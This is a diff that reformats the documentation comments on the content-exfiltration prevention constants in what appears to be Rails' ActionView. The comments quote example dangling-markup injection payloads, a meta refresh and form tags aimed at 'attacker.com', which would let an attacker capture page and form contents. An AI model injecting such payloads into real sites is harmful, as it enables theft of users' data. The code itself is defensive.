@@ -13,7 +13,7 @@ module ActionView
       #   <meta http-equiv="refresh" content='0;URL=https://attacker.com?
       #
       # The HTML following this tag, up until the next single quote would be sent to
-      # https://attacker.com. By closing any open attributes, we ensure that form
+      # +https://attacker.com+. By closing any open attributes, we ensure that form
       # contents are never exfiltrated this way.
       CLOSE_QUOTES_COMMENT = %q(<!-- '"` -->).html_safe.freeze
 
@@ -23,11 +23,12 @@ module ActionView
       #
       # For example, an attacker might inject:
       #
-      # <form action="https://attacker.com"><textarea>
+      #   <form action="https://attacker.com"><textarea>
       #
-      # The HTML following this tag, up until the next `</textarea>` or the end of
-      # the document would be captured by the attacker's <textarea>. By closing any
-      # open textarea tags, we ensure that form contents are never exfiltrated.
+      # The HTML following this tag, up until the next <tt></textarea></tt> or
+      # the end of the document would be captured by the attacker's
+      # <tt><textarea></tt>. By closing any open textarea tags, we ensure that
+      # form contents are never exfiltrated.
       CLOSE_CDATA_COMMENT = "<!-- </textarea></xmp> -->".html_safe.freeze
 
       # Close any open option tags before each form tag. This prevents attackers
@@ -35,11 +36,12 @@ module ActionView
       #
       # For example, an attacker might inject:
       #
-      # <form action="https://attacker.com"><option>
+      #   <form action="https://attacker.com"><option>
       #
-      # The HTML following this tag, up until the next `</option>` or the end of
-      # the document would be captured by the attacker's <option>. By closing any
-      # open option tags, we ensure that form contents are never exfiltrated.
+      # The HTML following this tag, up until the next <tt></option></tt> or the
+      # end of the document would be captured by the attacker's
+      # <tt><option></tt>. By closing any open option tags, we ensure that form
+      # contents are never exfiltrated.
       CLOSE_OPTION_TAG = "</option>".html_safe.freeze
 
       # Close any open form tags before each new form tag. This prevents attackers
@@ -47,11 +49,11 @@ module ActionView
       #
       # For example, an attacker might inject:
       #
-      # <form action="https://attacker.com">
+      #   <form action="https://attacker.com">
       #
-      # The form elements following this tag, up until the next `</form>` would be
-      # captured by the attacker's <form>. By closing any open form tags, we
-      # ensure that form contents are never exfiltrated.
+      # The form elements following this tag, up until the next <tt></form></tt>
+      # would be captured by the attacker's <tt><form></tt>. By closing any open
+      # form tags, we ensure that form contents are never exfiltrated.
       CLOSE_FORM_TAG = "</form>".html_safe.freeze
 
       CONTENT_EXFILTRATION_PREVENTION_MARKUP = (CLOSE_QUOTES_COMMENT + CLOSE_CDATA_COMMENT + CLOSE_OPTION_TAG + CLOSE_FORM_TAG).freeze
